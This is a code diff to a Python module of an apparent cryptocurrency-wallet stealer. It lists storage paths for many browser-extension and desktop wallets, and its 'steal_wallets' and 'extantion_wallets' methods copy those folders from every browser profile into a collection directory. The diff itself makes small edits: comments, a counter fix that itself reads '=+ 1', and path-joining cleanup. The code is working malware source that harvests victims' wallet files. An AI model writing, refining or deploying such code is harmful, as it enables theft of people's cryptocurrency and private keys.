@@ -9,6 +9,8 @@ import log_Style
 
 
 
+
+# this is wallet extanction of browser
 EXTANTION_WALLET: dict[str, str] = {
     "Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
     "Binance":         "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
@@ -68,6 +70,8 @@ EXTANTION_WALLET: dict[str, str] = {
     "iWallet":         "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
 }
 
+
+# this is desktoop wallets
 APPDATA_PATH: str = os.getenv("APPDATA")
 DESKTOP_WALLETS: dict[str, str] = {
     # Bitcoin & Forks
@@ -156,22 +160,31 @@ class Wallets:
         for wallet_name, path in DESKTOP_WALLETS.items():
             if not os.path.exists(path):
                 continue
+
             self.steal_wallets(path, folder_path, wallet_name)
+            
         self.extantion_wallets(folder_path)
             
     # steal wallets folders
     def steal_wallets(self, path: str, new_path: str, wallet_name: str)-> None:
         new_wallet_path: str = os.path.join(new_path, "Wallets", wallet_name)
+
         if os.path.isdir(path) and os.listdir(path):
-            +1
+
+            log_Style.ALL_WALLETS_IN_COMPUTER =+ 1
             os.makedirs(new_wallet_path, exist_ok=True)
+
+
             try:
                 shutil.copytree(path, os.path.join(new_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
             except Exception as err:
                 print(err)
+
         elif os.path.isfile(path):
+
             log_Style.ALL_WALLETS_IN_COMPUTER += 1
             os.makedirs(new_wallet_path, exist_ok=True)
+
             try:
                 shutil.copy2(path, os.path.join(new_path, os.path.basename(path)))
             except Exception as err:
@@ -179,6 +192,7 @@ class Wallets:
                 
     def extantion_wallets(self, folder: str) -> None:
         browser_path: dict[str, dict[str, str]] = allBrowsersPath()
+
         profiles: list[str] = [
             'Default',
             'Profile 1',
@@ -197,7 +211,7 @@ class Wallets:
                     continue
 
                 for profile in profiles:
-                    all_wallet_path: str = f"{path_browser['path_data']}\\{profile}\\{paths}"
+                    all_wallet_path: str = os.path.join(path_browser['path_data'], profile, paths)
                     if not os.path.exists(all_wallet_path):
                         continue
                     
